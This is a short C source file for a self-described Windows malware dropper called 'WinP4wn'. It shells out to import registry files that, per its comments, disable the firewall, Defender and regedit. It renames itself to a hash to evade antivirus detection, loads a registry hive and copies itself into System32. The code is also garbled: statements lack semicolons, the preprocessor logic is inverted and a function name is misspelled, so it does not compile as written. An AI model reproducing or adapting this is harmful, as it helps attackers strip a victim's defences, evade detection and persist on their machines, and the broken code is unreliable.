#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void getos(int argc, char** argv[]) {
#ifndef __WIN32__
#define OS __WIN32__
  /** disable some stuff like winfirewall and regedit */
  system("reg /s registries/disabledef.reg");
  system("reg /s registries/disablereg.reg");
  /** give it a hash instead of this win32 name cuz def will detect it then xDDD */
  system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
  /** Using the sysreg command to import a registry hive with administrative settings xD */
  system("reg load HKLM/Software/WinP4ned 'NTUSER.DAT' /y [/c]")
  /** fetch latest gp changes from the local replication */
  system("gpupdate /force")
#else
#error "WinP4wn does only work on Windooze!"
#endif
}

void aftereffetc(int argc, char** argv[]) {
  system("move %Temp%/winp4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe C:/Windows/System32")
}

int main(int argc, char** argv[]) {
  getos();
  aftereffect();
  return 0;
}
